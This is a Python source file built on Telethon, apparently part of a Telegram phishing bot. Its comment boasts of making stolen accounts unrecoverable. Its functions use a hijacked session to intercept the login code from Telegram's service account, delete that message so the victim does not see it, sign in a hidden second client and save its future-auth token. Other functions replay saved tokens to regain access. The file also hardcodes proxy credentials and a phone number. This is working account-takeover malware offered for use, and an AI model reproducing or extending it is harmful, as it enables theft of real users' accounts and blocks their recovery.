from telethon import TelegramClient, events
from telethon.sessions import StringSession
import asyncio
import socks
from telethon.tl.types import CodeSettings
import re
import random
import telethon
import ast
import queue
import phonenumbers
from app.bot.src.crtdb import create_database, get_records, delete_record, insert_record
from phonenumbers import geocoder
from telethon.tl.types.auth import LoggedOut

queue = asyncio.Queue()

api_id = 1
api_hash = 'b6b154c3707471f5339bd661645ed3d6'
session_string = '2'
proxy = (socks.HTTP, '185.162.130.86', int(10000), True, 'T9FFNm2F9bwnbpnsls5x', '6BffIxsWs70Rqbeqk4pZxNrfSHqWa8G0')
client = TelegramClient('4141',api_hash=api_hash,api_id=api_id, proxy=proxy, 
            device_model="iPhone 13 Pro Max",
            system_version="14.8.1",
            app_version="8.4")
async def clone_session(
        proxy:any,
        client: TelegramClient,
        api_id: int,
        api_hash: str,
        pathtocodes: str,
        phone: str
):
    
    #после того как ты входишь в аккаунт выдается токен, который способен вернуть тебя если ты выйдешь из аккаунта. Я подарил жизнь фишингу тг, теперь после того как человек терял аккаунт он не мог выгнать чужую сессию, ведь ее просто не было
    
    create_database('app/bot/src/db.db')
    await client.connect()
    asyncio.sleep(random.randint(1, 40))
    me = await client.get_me()
    if not me:
        return False, 'unauth'
    done_event = asyncio.Event()
    phone = me.phone
    if not phone.startswith('+'):
        phone_raw = '+' + phone
    else:
        phone_raw = phone
    parsed_number = phonenumbers.parse(phone_raw)
    iso_code = phonenumbers.region_code_for_number(parsed_number)
    new_client = TelegramClient(f'temp/{str(random.randint(100000000000000000, 999999999999999999))}' ,api_hash=api_hash,api_id=api_id, proxy=proxy, 
            device_model="iPhone 13 Pro Max",
            system_version="14.8.1",
            app_version="8.4")
    await new_client.connect()
    code = None
    @client.on(events.NewMessage)
    async def handler(event):
        nonlocal code


        sender = await event.get_sender() 
        if sender.id == 777000:
            message_text = event.message.text
            print(f"Получено новое сообщение: {message_text} от {sender.id}")
            match = re.search(r'\d{5}', message_text)
            if match:
                code = match.group(0)
                print(f"code: {code}")
                await event.message.delete()
                client.remove_event_handler(handler, events.NewMessage)
                done_event.set()


    wait_task = asyncio.create_task(asyncio.wait_for(done_event.wait(), timeout=60))
    sent_code = await new_client(telethon.functions.auth.SendCodeRequest(
        phone_number=phone,
        api_id=api_id,
        api_hash=api_hash,
        settings=CodeSettings()
        ))
    print(sent_code)
    try:
        await wait_task
    except asyncio.TimeoutError:
        print("Timeout waiting for the code")
        client.remove_event_handler(handler, events.NewMessage)
        await new_client.disconnect()
        new_client.session.delete()   
    except Exception as e:
        print("Error waiteng code: " + str(e))
        client.remove_event_handler(handler, events.NewMessage)
        await new_client.disconnect()
        new_client.session.delete()   
    
    auth_result = await new_client(telethon.functions.auth.SignInRequest(
        phone_number=phone,
        phone_code_hash=sent_code.phone_code_hash,
        phone_code=code,
    ))
    print(auth_result)

    insert_record('app/bot/src/db.db', phone, auth_result.future_auth_token, iso_code)
    await new_client.log_out()
    await client.log_out()
    return True, None
    

async def queue_worker():
    while True:
        params = await queue.get()
        try:
            result = await clone_session(**params)
            if result:
                print(f"Успешно завершен clone_session  {params['phone']}: код {result}")
            else:
                print(f"Не удалось выполнить clone_session {params['phone']}")
        except Exception as e:
            print(f"Ошибка в queue_worker для {params['phone']}: {e}")
        finally:
            queue.task_done()


async def add_to_queue(proxy, client, api_id, api_hash, pathtocodes, phone):
    await queue.put({
        'proxy': proxy,
        'client': client,
        'api_id': api_id,
        'api_hash': api_hash,
        'pathtocodes': pathtocodes,
        'phone': phone
    })
    print(f"Задача для {phone} (путь: {pathtocodes}) добавлена в очередь")



async def accept_session(line:str,proxy: any, api_id, api_hash, clone_dir, password:str):

    phone, future_token, iso = line
    phone_n = re.sub(r'\D', '', phone)
    new_client = TelegramClient(clone_dir + "/" + phone_n ,api_hash=api_hash,api_id=api_id, proxy=proxy, 
        device_model='Firefox 122',
        system_version='Windows',
        app_version='10.9.56 A',
        system_lang_code='en-us',
        lang_code='en'
        )

    print('future token ' + future_token)
    await new_client.connect()
    try:
        print('code')
        print(await new_client(telethon.functions.auth.SendCodeRequest(
            phone_number=phone_n,
            api_id=api_id,
            api_hash=api_hash,
            settings=CodeSettings(logout_tokens=[future_token])
        )))
    except telethon.errors.SessionPasswordNeededError:
        try:
            await new_client.sign_in(password='qq122')
        except:
            pass

    
    delete_record('app/bot/src/db.db', phone=phone)
    await new_client.disconnect()

async def acc():
    new_client = TelegramClient('79286976833',api_hash=api_hash,api_id=api_id, proxy=proxy, 
        device_model="iPhone 13 Pro Max",
        system_version="14.8.1",
        app_version="8.4")

    await new_client.connect()
    tkn = b'\x17\xea\xb1h\xc4l\xbe\xd1\xaa\x1e\xdb>$)\x1f\xe8.\x92'

    sent_code = await new_client(telethon.functions.auth.SendCodeRequest(
        phone_number='79286976833',
        api_id=api_id,
        api_hash=api_hash,
        settings=CodeSettings(logout_tokens=[tkn])
    ))
    print(sent_code)
    print(sent_code)
    print(sent_code)
    print(sent_code)
    print(sent_code)

    await new_client.disconnect()


